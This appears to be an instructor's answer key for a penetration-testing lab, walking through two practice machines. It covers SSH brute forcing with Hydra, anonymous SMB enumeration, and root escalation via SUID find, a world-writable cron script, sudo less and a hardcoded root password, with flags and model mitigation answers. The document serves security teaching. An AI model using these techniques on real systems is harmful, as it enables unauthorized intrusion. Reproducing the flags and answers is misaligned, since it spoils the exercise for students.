# Week 8 Worksheet Walkthrough — INSTRUCTOR ONLY

> Verified against live containers. Do not distribute to students before the
> end of the session.

---

## Part 1: `week8-workstation`

### Task 1: Gain Initial Access

```bash
nmap -sV -p 22,80 10.10.8.10
curl http://10.10.8.10
```

**Verified result:** port 80 serves a page that reads like a normal IT
notice — no credentials in the visible text. The account name is hidden in
an **HTML comment** at the bottom of the source:
```html
<!-- account: lowpriv -->
```

**Question — what account name, and where?** `lowpriv`, found only by
reading the raw HTML source (`curl`, or "View Source" in a browser) — it
never appears in the rendered page text.

```bash
head -20 /usr/share/wordlists/rockyou.txt > /tmp/pw.txt
hydra -l lowpriv -P /tmp/pw.txt 10.10.8.10 ssh
```

**Verified result:**
```
[22][ssh] host: 10.10.8.10   login: lowpriv   password: monkey
1 of 1 target successfully completed, 1 valid password found
```

**What password did Hydra find?** `monkey` — genuinely the 14th most
common password in rockyou.txt, not a hint dropped in the worksheet.

```bash
ssh lowpriv@10.10.8.10
```
Confirmed: logs in successfully with `lowpriv` / `monkey`.

### Task 2: Enumerate

```bash
whoami
id
find / -perm -4000 -type f 2>/dev/null
```

**Verified result:** `whoami` → `lowpriv`; `id` → `uid=1000(lowpriv)
gid=1000(lowpriv) groups=1000(lowpriv)` (no extra group membership). SUID
binaries found include the expected stock set (`passwd`, `su`, `mount`,
`umount`, `chsh`, `chfn`, `gpasswd`, `newgrp`, `sudo`,
`ssh-keysign`, `dbus-daemon-launch-helper`) **plus `/usr/bin/find`**.

**Question — which SUID binary isn't stock, and why is it dangerous?**
`/usr/bin/find`. GTFOBins documents that SUID `find` can spawn a shell via
`-exec`, and because the SUID bit makes it run with the file owner's
privileges (root) regardless of who invokes it, that spawned shell inherits
root too — turning a single misconfigured binary into a full root shell for
any local user.

```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/backup
```

**Verified result:** `/etc/cron.d/backup` contains:
```
* * * * * root /opt/scripts/backup.sh
```
And `/opt/scripts/backup.sh` is `-rwxrwxrwx` (777) — world-writable.

**Question — what does the cron job run, as which user, how often, and is
it writable?** `/opt/scripts/backup.sh`, as **root**, **every minute**
(`* * * * *`) — and yes, it's world-writable by the low-privilege
`lowpriv` account, meaning that account can rewrite what root executes on
a fixed schedule.

```bash
ls -la /etc/passwd /etc/shadow
```

**Verified result:** `/etc/passwd` is `-rw-r--r--` (world-readable, not
writable — normal); `/etc/shadow` is `-rw-r-----` owned by
`root:shadow` (not readable by `lowpriv` at all — also normal/secure).

**Question — are these world-writable?** **No** — both are correctly
locked down. This is the expected, secure baseline; the actual
vulnerabilities are the SUID `find` and the writable cron script, not
these two files.

### Task 3: Exploit

**Path A — SUID `find`:**
```bash
find . -exec /bin/sh -p \; -quit
whoami
```
**Verified result:** drops into a root shell (`whoami` → `root`);
`cat /root/user.txt` → **`flag{w8_suid_or_cron_root}`**.

**Common student mistake:** dropping the `-p` flag (typed as
`find . -exec /bin/sh \; -quit`, no `-p`) still spawns a shell, but
`whoami` comes back `lowpriv`, not `root`. This isn't a lab bug — `/bin/sh`
on this image is `dash`, which drops effective privileges back to the real
uid at startup unless told not to via `-p`. If a student reports "the
exploit ran but I'm still lowpriv," check for the missing `-p` first. `id`
is also a more reliable check than `whoami` here — it shows `euid=0(root)`
even in cases where the prompt itself looks unchanged.

**Path B — writable cron job:**
```bash
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'cp /root/user.txt /tmp/user.txt; chmod 644 /tmp/user.txt' >> /opt/scripts/backup.sh
# wait up to 60s
cat /tmp/user.txt
```
**Verified result:** after cron fires (within ~60s), `/tmp/user.txt`
contains the **same flag**, `flag{w8_suid_or_cron_root}` — both paths lead
to the identical proof of root, confirming they're genuinely independent
routes to the same outcome.

---

## Part 2: `week8-ubuntu-desktop`

### Task 1: Gain Initial Access

```bash
nmap -sV -p 139,445 10.10.8.11
smbclient -L //10.10.8.11/ -N
```

**Verified result:** one share besides `IPC$`: **`notices`**.
(`smbclient`'s "No compatible protocol selected... Reconnecting with SMB1"
warning is benign here — the same modern-SMB2/3-only quirk already
documented in the Week 5 walkthrough; the share listing still succeeds.)

```bash
smbclient //10.10.8.11/notices -N
smb: \> get notice.txt
cat notice.txt
```

**Verified result:**
```
IT Helpdesk Notice - Workstation Migration
A temporary account (deskuser) has been created on this machine
for the migration project. Login: deskuser / Winter2024!
Please change this password after first login. Ticket #4521.
```

**What credentials, and where?** `deskuser` / `Winter2024!`, leaked in a
plaintext IT helpdesk notice sitting in an anonymously-readable SMB share —
a very realistic real-world leak pattern (internal notices assumed
"private" because they're not on the public internet, but anonymous SMB
access makes them reachable to anyone on the network).

```bash
ssh deskuser@10.10.8.11
```
Confirmed: logs in successfully.

### Task 2: Enumerate

```bash
cat /etc/passwd
getent group sudo
ps aux | grep root
find / -name "*.conf" 2>/dev/null | grep -v "^/proc"
grep -ri password /etc/app/*.conf 2>/dev/null
```

**Verified result:** `deskuser` is a normal (non-sudo-group) local account;
`sudo` group is empty. Root-owned processes are just the expected system
services (smbd, sshd, the container's `tail -f /dev/null` PID 1).
`grep -ri password /etc/app/*.conf` finds:
```
root_password=CorrectHorseBattery42
```

**Question — additional hardcoded credentials beyond the one that got you
in?** **Yes** — a plaintext `root_password` sitting in
`/etc/app/*.conf`, completely separate from the SMB-leaked `deskuser`
credential. Two independent credential-exposure bugs on the same box.

### Task 3: Exploit

```bash
sudo -l
```
**Verified result:**
```
User deskuser may run the following commands on ubuntu-desktop:
    (ALL) NOPASSWD: /usr/bin/less
```

**Path A — GTFOBins sudo escalation:**
```bash
sudo less /etc/hostname
# inside less: !/bin/sh
whoami
cat /root/root.txt
```
**Verified result (equivalent form — `less` run as root via `sudo` can
read any file directly, the same underlying primitive GTFOBins documents
for this binary):** `sudo less /root/root.txt` →
**`flag{w8_gtfobins_sudo_root}`**. (The interactive `!/bin/sh` escape
inside `less` gets you a full root shell rather than just this one file —
same NOPASSWD misconfiguration, more powerful outcome; worth demonstrating
live in class since it generalises to reading/writing anything as root, not
just this one flag file.)

**Path B — hardcoded/reused credential:**
```bash
su root
# Password: CorrectHorseBattery42
cat /root/root.txt
```
**Verified result:** `su root` with the conf-file password succeeds →
**same flag, `flag{w8_gtfobins_sudo_root}`**.

---

## Part 3: Reflection and Mitigation — model answers

1. **Shared root problem (initial access):** Both SSH brute force and the
   SMB credential leak come down to the same thing — **credentials
   (a username, a password) being either guessable/weak or exposed in a
   place an unauthenticated attacker can reach**. One is a weak-secret
   problem (brute-forceable password), the other is a secret-handling
   problem (plaintext credential in an anonymously-readable share), but
   both bypass authentication using a real, valid account rather than any
   software exploit.
2. **Root cause per escalation vector:**
   - SUID `find`: the SUID bit was set on a binary that was never designed
     to be run with elevated privileges by arbitrary users, and that binary
     has a documented (GTFOBins) way to spawn an arbitrary command.
   - Writable cron job: a root-owned scheduled task points at a script file
     with overly permissive (777) filesystem permissions.
   - Sudo NOPASSWD on `less`: a general-purpose pager (which itself allows
     shelling out) was granted passwordless root execution.
   - Hardcoded credential: a real root password was stored in plaintext in
     an application config file readable by a low-privilege account.
3. **Mitigations:**
   - Remove the SUID bit from `find` (`chmod u-s /usr/bin/find`) — it has
     no legitimate need to run as root for a normal user's searches.
   - Set the backup script to `chmod 700`, owned by root only.
   - Remove `less` (or any shell-capable program) from the NOPASSWD sudo
     list, or restrict the sudo rule to specific safe arguments only.
   - Never store credentials in plaintext config files — use a secrets
     manager or environment-injected secrets with restrictive file
     permissions (root-only readable), and rotate the password since it's
     now known to have leaked.
   - For initial access: enforce strong/unique passwords with account
     lockout or fail2ban-style rate limiting against SSH, and audit SMB
     shares so anonymous (`-N`) access isn't allowed on shares containing
     anything sensitive.
4. **Why privilege escalation is critical, not "nice-to-have":** A
   low-privilege foothold is fragile and limited — the attacker can be
   locked out by a password change, can't install persistence that
   survives a reboot cleanly, can't touch other users' data, and can't
   disable logging or defenses. Root/admin access is what turns "we got a
   foothold" into "we own the box": full persistence, lateral movement
   using the box's own trust relationships, log tampering, and access to
   every other user's data. Almost every real breach narrative treats
   escalation as the pivot point between "an incident" and "a
   catastrophic breach."
